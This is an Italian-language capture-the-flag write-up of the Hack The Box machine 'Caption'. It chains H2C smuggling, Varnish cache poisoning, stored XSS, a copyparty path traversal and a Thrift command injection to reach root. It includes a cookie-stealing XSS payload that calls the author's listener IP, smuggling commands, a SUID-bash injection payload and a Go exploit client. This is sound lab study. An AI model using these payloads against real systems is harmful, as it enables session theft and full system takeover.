+++
date = '2026-10-22T13:08:58+02:00'
draft = false
title = 'Caption Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`21/10/2026`**

![pwn.png](/images/imgs_caption/pwn.png)

# Introduzione

**_Caption_** è una macchina **Linux** di livello **Hard** che richiede il concatenamento di diverse vulnerabilità web per ottenere l'accesso iniziale, seguito dallo sviluppo di un client RPC per la privilege escalation.

L'exploitation path inizia con la scoperta di credenziali hardcoded all'interno di un repository **Git** per accedere a un portale. L'analisi della configurazione di backend rivela un setup di un **reverse proxy** vulnerabile all'**H2C Smuggling**, che permette di bypassare le **ACL**. Combinando questo con l'**avvelenamento della cache** di **Varnish**, è possibile rubare il cookie dell'admin. Questo accesso espone un servizio **copyparty** interno, vulnerabile ad una **Path Traversal**, tramite la quale è possibile recuperare una **chiave SSH**. Infine, la privilege escalation prevede l'analisi di un'applicazione in **Go** che utilizza **Apache Thrift** vulnerabile ad una **Command Injection**, e la scrittura di un **Thrift client** per triggerare l'esecuzione e ottenere una **root** shell.

# Tecniche Utilizzate

- **Source Code Review & Git Commit History Analysis**

- **H2C Smuggling attack (HAProxy / Varnish)**

- **Cache Poisoning**

- **Cookie Theft (Stored XSS)**

- **Copyparty Path Traversal (CVE-2023-37474)** 

- **Apache Thrift RPC Exploitation**

- **Go Scripting**

- **SUID Command Injection**

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- caption
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV caption
```

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http-proxy HAProxy http proxy 2.0.0 or later
|_http-title: Did not follow redirect to http://caption.htb
|_http-open-proxy: Proxy might be redirecting requests
8080/tcp open  http       Jetty
|_http-title: GitBucket
Service Info: OS: Linux; Device: load balancer; Cnel
```

**Porte aperte**:

- **22**/tcp - SSH

- **80**/tcp - HAProxy HTTP Proxy

- **8080**/tcp - Jetty (GitBucket)

Ho aggiunto **`caption.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Web

Ho lanciato due scansioni in background con **gobuster** e **ffuf**, che non hanno rilevato nulla di interessante. Sulla porta **`80`** era hostato un login portal.

![web1.png](/images/imgs_caption/web1.pngz)

Ho spostato la mia attenzione sul servizio **Jetty HTTP** sulla porta **`8080`**, dove era hostata un'istanza **GitBucket**.

![web2.png](/images/imgs_caption/web2.png)

Esplorando la piattaforma, ho trovato due repository:

1. **`/Caption-Portal`**:

![buck1.png](/images/imgs_caption/buck1.png)

La directory **`/app`** conteneva l'**index** e i **CSS** della pagina web.

![app.png](/images/imgs_caption/app.png)

Mentre **`/config`** conteneva i file di configurazione per i servizi **HAProxy** e **Varnish**.

![config.png](/images/imgs_caption/config.png)

2. **`/Logservice`**:

![buck2.png](/images/imgs_caption/buck2.png)

Conteneva il codice sorgente di un **servizio di log interno** (il file **`server.go`** specificava che era in ascolto sulla porta **`9090`**).

![logservice.png](/images/imgs_caption/logservice.png)

**Nota**: _**HAProxy** agisce da **reverse proxy** e **load balancer**, distribuendo il traffico degli utenti sui server di backend per prevenire sovraccarichi ed escludendo i nodi irraggiungibili tramite **health checks** attivi. **Varnish**, d'altra parte, è un **acceleratore HTTP** (caching reverse proxy) che archivia copie delle pagine generate dal server direttamente nella **RAM**, servendo le richieste successive istantaneamente dalla memoria senza dover interrogare nuovamente il backend._

Prima di passare al codice, ho controllato la **commit history**. Un passaggio obbligatorio nella mia metodologia quando ho a che fare con repository **Git** esposti. Ho trovato una password in chiaro nel commit **`98f2c36131078270dd3e11865f7a559d488666a1`**.

![clearpass.png](/images/imgs_caption/clearpass.png)

Ho usato questa password per accedere al **Caption-Portal** come utente **`margo`**.

![logged.png](/images/imgs_caption/logged.png)

La sezione **`Firewall`** mostrava una nota:

![note.png](/images/imgs_caption/note.png)

Visitando la sezione **`Logs`** si riceve un **`403 Forbidden`**.

![403.png](/images/imgs_caption/403.png)

---

# Accesso Iniziale | H2C Smuggling → Cache Poisoning → Stored XSS → CVE-2023-37474 → ECDSA Key

A questo punto, ho analizzato le configurazioni del proxy dal repository **Git** per capire perché **`Logs`** veniva bloccato.

Il server **HAProxy** è in ascolto sulla porta **`80`** e inoltra il traffico al server di backend (**Varnish**), in ascolto su **`localhost:6081`**:

![code1.png](/images/imgs_caption/code1.png)

Tre **Access Control Lists** (**ACLs**) elaborano le richieste:

1. Nega le richieste se il percorso contiene caratteri non validi come **`//`** o **`%`**.

2. Nega le richieste se il percorso inizia con **`/logs`** o **`/download`**.

3. Reindirizza qualsiasi host header diverso da **`caption.htb`**.

Il file **`varnish.service`** confermava che il servizio era in ascolto su **`localhost:6081`** e accetta richieste **`HTTP/2`**.

![varnis.png](/images/imgs_caption/varnis.png)

Il file **`default.vcl`** mostra che: se una pagina è in cache, restituisce direttamente la risposta; in caso contrario, inoltra la richiesta alla web app interna sulla porta **`8000`**

```vcl
<SNIPPET>
    vcl 4.0;
     
    backend default {
        .host = "127.0.0.1";
        .port = "8000";
    }
<SNIPPET>
```

Questa configurazione è il perfetto scenario per un **attacco H2C Smuggling**.

**Note**: _**H2C Smuggling** sfrutta il meccanismo di Upgrade di **`HTTP/1.1`** per stabilire un tunnel diretto **`HTTP/2`** in chiaro (**h2c**) con un server di backend attraverso un **reverse proxy**. Una volta che il proxy elabora l'upgrade, smette di analizzare il traffico **HTTP** e agisce come un **relay TCP** cieco. Questo permette ad un attaccante di comunicare direttamente col backend, **bypassando le ACL** di front-end, **accedendo ad endpoint interni**, **eseguendo SSRF**, e **iniettando header HTTP arbitrari** (**Header Spoofing**) che verrebbero normalmente bloccati o sanitizzati dal proxy di front-end._

**HAProxy** blocca **`/logs`** e **`/download`** tramite **ACL**, ma inoltra ciecamente gli header **`Upgrade`** e **`Connection`** al backend. Poiché **Varnish** accetta **`HTTP/2`** in chiaro (**h2c**), inviare una richiesta con **`Upgrade: h2c`** porta **HAProxy** a stabilire un tunnel persistente verso **Varnish**. Dopo aver ricevuto la risposta **101 Switching Protocols**, **HAProxy** smette di ispezionare il traffico e lo tratta come un flusso di byte grezzi. A quel punto si possono inviare richieste **`HTTP/2`** "**smuggled**" all'interno di quel tunnel per raggiungere percorsi limitati, **bypassando completamente le ACL** di **HAProxy**.

Dopo aver testato la vulnerabilità con [h2csmuggler](https://github.com/BishopFox/h2csmuggler)

![h2c.png](/images/imgs_caption/h2c.png)

Ho estratto il **cookie** di sessione **`margo`** dai **DevTools** del browser

![cookie2.png](/images/imgs_caption/cookie2.png)

E ho targhettato l'endpoint **`/logs`**:

```bash
python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'
```

![h2c2.png](/images/imgs_caption/h2c2.png)

Ho raggiunto **`/logs`** attraverso il tunnel, ma ricevevo un **`role_error`**. Questo indicava la presenza di diversi livelli di privilegio (come un ruolo **admin**) all'interno dell'applicazione. Anche la nota trovata in precedenza nella sezione **`Firewall`** confermava che gli amministratori stavano lavorando attivamente su quei servizi. Inoltre, ispezionando il **cookie di sessione** si notava l'assenza del flag **`HttpOnly`**.

![cookie1.png](/images/imgs_caption/cookie1.png)

**Nota**: _Il cookie di sessione dell'applicazione non aveva il flag **`HttpOnly`**, esponendolo al furto tramite **Cross-Site Scripting** (**XSS**)._

Questo dettaglio critico, combinato con la presenza di un bot amministrativo, ha immediatamente indirizzato il mio ragionamento verso la ricerca di una vulnerabilità **XSS** per eseguire un **Cookie Theft**.

Navigando su **`/firewalls`** in **Burp Suite**, ho notato che la risposta veniva servita dalla **cache di Varnish**. Inoltre, l'applicazione rifletteva l'header **`X-Forwarded-Host`** all'interno del parametro **`utm_source`** nei tag **`href`** e **`src`** senza alcuna sanitizzazione.

Sapendo che l'**h2c smuggling** permette l'**arbitrary header spoofing**, ho craftato un payload per **avvelenare la cache di Varnish** in concomitanza con il refresh della risorsa:

```text
X-Forwarded-Host: stars"></script><script>fetch("http://10.10.16.77:22667/log?cookie="+btoa(document.cookie));</script><"
```

Quando il backend ha recupera la risorsa, **Varnish** memorizza la risposta avvelenata. Non appena il bot admin visita la pagina, riceve il payload **XSS** in cache, esegue il **JavaScript**, e invia il suo cookie al mio listener.

![poison.png](/images/imgs_caption/poison.png)

Con il cookie dell'admin, ho inviato un'altra richiesta a **`/logs`**:

```bash
python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: session=<admin_cookie>'
```

![h2c3.png](/images/imgs_caption/h2c3.png)

All'interno di **`ssh_logs`** non ho trovato nulla di immediatamente utile. Ho quindi richiesto direttamente **`/download?url=http://127.0.0.1:3923/`**. Analizzando il codice sorgente di questa risposta, ho notato dei riferimenti a una directory **`/.cpr/`**. Questo mi ha rivelato che l'applicazione backend sulla porta **`3923`** era **copyparty**, un server di file-sharing leggero scritto in **Python**.

Cercando exploit per **copyparty**, ho trovato una vulnerabilità nota di **Path Traversal** (**CVE-2023-37474**):
- https://www.exploit-db.com/exploits/51636

**Nota**: _Le versioni di **Copyparty** precedenti alla **`1.8.6`** soffrono di una vulnerabilità di **Directory Traversal** non autenticata. L'applicazione non sanitizza correttamente i path **URL-encoded**, permettendo ad un attaccante di sfuggire dalla web root e **leggere file arbitrari** sul sistema._

Inizialmente ho avuto problemi a far funzionare la **path traversal** attraverso il tunnel **H2C**. Ho chiesto supporto ad un'**IA** per la struttura del comando, grazie alla quale ho capito che era necessario un **doppio URL-encoding**: la prima codifica permette alla richiesta di passare in modo sicuro attraverso il layer del proxy, mentre la seconda assicura che il servizio backend esegua effettivamente la traversal.

![passwd.png](/images/imgs_caption/passwd.png)

Una volta confermata la **path traversal**, il mio primo istinto è stato quello di cercare una **chiave SSH**, ed è qui che mi sono bloccato. Mi sono reso conto di essermi perso un dettaglio importante presente nell'output di **`ssh_logs`**: la **chiave SSH** c'era eccome, ma utilizzava il formato **ECDSA** (**`id_ecdsa`**) al posto dell'**RSA**.

**Nota**: _**ECDSA** (**Elliptic Curve Digital Signature Algorithm**) è un algoritmo di crittografia asimmetrica basato sulle curve ellittiche. Rispetto al tradizionale **RSA**, l'**ECDSA** fornisce un elevato livello di sicurezza utilizzando chiavi molto più corte. Per questo motivo, viene utilizzato sempre più spesso di default sui sistemi **Linux** moderni._

![ssh_key.png](/images/imgs_caption/ssh_key.png)

Ho recuperato la chiave privata di **`margo`**, per accedere via **SSH** alla macchina.

![initial.png](/images/imgs_caption/initial.png)

---

# Privilege Escalation | Apache Thrift RPC Exploitation → Go Scripting → SUID Command Injection

Una volta loggato come **`margo`**, ho iniziato l'enumerazione interna e soffermandomi sul servizio in esecuzione sulla porta **`9090`**.

```bash
ss -tuln
ps aux | grep server.go
```

![9090.png](/images/imgs_caption/9090.png)

![psaux.png](/images/imgs_caption/psaux.png)

Il processo girava come **root**, rendendolo un ottimo target per la compromissione totale. Sono tornato sul repository **GitBucket** per analizzare il codice sorgente di **Logservice**.

Il file **`.thrift`** definiva un singolo metodo **RPC**:

![thrift.png](/images/imgs_caption/thrift.png)

In **`server.go`**, la funzione **`ReadLogFile`** prende in input un **`filePath`** fornito dall'utente, lo apre tramite **`os.Open`** (causando una vulnerabilità di **Arbitrary File Read**), e lo analizza riga per riga cercando un IP e un campo **user-agent**. Dopodiché, costruisce un comando shell:

![server.png](/images/imgs_caption/server.png)

La variabile **`userAgent`** viene iniettata direttamente nella stringa di **`exec.Command`** senza alcuna sanitizzazione, portando a una **Command Injection**.

Dato che potevo controllare la scrittura dei file come utente **`margo`**, ho generato un **`/tmp/fall.log`** malevolo inserendo il payload nello **user-agent**.

```bash
echo "\"user-agent\":\"fall';cp /bin/bash /tmp/bash;chmod u+s /tmp/bash;'fall\"" > /tmp/fall.log
```

Questo payload evade dal costrutto **`echo`**, copia il binario **bash** in **`/tmp/bash`**, e gli assegna il **SUID** bit. Poiché il servizio viene eseguito come **root**, questo binario spawnerà una **root** shell.

Per innescare la vulnerabilità, avevo bisogno di un **client Apache Thrift**. Dato che non avevo mai programmato in **Go** prima d'ora, mi sono informato e ho utilizzato un'**IA** per aiutarmi a costruire e strutturare il client. Ho clonato il repository e preparato un workspace **Go** per compilarlo:

```bash
git clone http://caption.htb:8080/git/root/Logservice.git
cd Logservice
find gen-go -type d          
sudo mkdir -p /usr/local/go/src
sudo cp -r gen-go/log_service /usr/local/go/src/
cd /usr/local/go/src/log_service && sudo go mod init log_service
```

Ho quindi creato il progetto per il client:

```bash
mkdir -p ~/HTB/Machines/Caption/thrift-client && cd ~/HTB/Machines/Caption/thrift-client
go mod init main
```

**`client.go`**:

```Go
package main

import (
    "context"
    "log"

    "github.com/apache/thrift/lib/go/thrift"
    logservice "log_service"
)

func main() {
    // transport --> localhost:9090
    transport, err := thrift.NewTSocket("localhost:9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
    defer transport.Close()

    // open connection
    if err := transport.Open(); err != nil {
        log.Fatalf("Error opening transport: %v", err)
    }
    log.Println("Transport opened")

    // configure binary protocol
    protocolFactory := thrift.NewTBinaryProtocolFactoryDefault()
    protocol := protocolFactory.GetProtocol(transport)

    // LogService client
    client := logservice.NewLogServiceClientProtocol(transport, protocol, protocol)

    // call ReadLogFile through the target path
    ctx := context.Background()
    filePath := "/tmp/fall.log" // <-- payload path

    result, err := client.ReadLogFile(ctx, filePath)
    if err != nil {
        log.Fatalf("Error calling ReadLogFile: %v", err)
    }
    log.Println("ReadLogFile result:", result)
}
```

Per linkare localmente i binding **Thrift** generati, ho aggiornato il **`go.mod`**:

```Go
require log_service v0.0.0

replace log_service => /usr/local/go/src/log_service
```

Siccome il servizio era bindato localmente sul target, ho fatto **local port forwarding** con **SSH** per ponteggiare la porta **`9090`** verso la mia macchina attaccante:

```bash
ssh -L 9090:127.0.0.1:9090 -i id_ecdsa margo@caption.htb
```

Infine, ho compilato ed eseguito il client:

```bash
go mod tidy
go run client.go
```

![readlog.png](/images/imgs_caption/readlog.png)

Ho eseguito il binario **SUID** con la flag **`-p`** per preservare i permessi:

```bash
/tmp/bash -p
```

![rootfù.png](/images/imgs_caption/rootfù.png)

**Root**.

---

# Considerazioni Finali

Questo box mi ha richiesto circa 3 giorni per il pwn, principalmente a causa della ripida curva di apprendimento di alcuni dei nuovi concetti introdotti.

Studiare ed eseguire correttamente la tecnica dell'**H2C Smuggling** mi ha portato via molto tempo, e concatenarla al **Varnish cache poisoning** per rubare il cookie è stata una kill chain geniale. La privilege escalation mi è sembrata leggermente più facile rispetto al foothold iniziale, ma richiedeva comunque solide basi di code review e l'abilità di scriptare un **client RPC** in **Go**, rivelatasi un'ottima esperienza di apprendimento (ho utilizzato un'**IA** per strutturare il boilerplate in **Go**). Nel complesso, il rating "**Hard**" è strameritato.

**Fonti**:

- **H2C Smuggler (BishopFox) | https://github.com/BishopFox/h2csmuggler**

- **Copyparty Path Traversal (CVE-2023-37474) | https://www.exploit-db.com/exploits/51636**

- **H2C Smuggling Vulnerability (PortSwigger) | https://portswigger.net/web-security/http-smuggling/advanced/h2c-smuggling**

- **Apache Thrift Go Library | https://github.com/apache/thrift**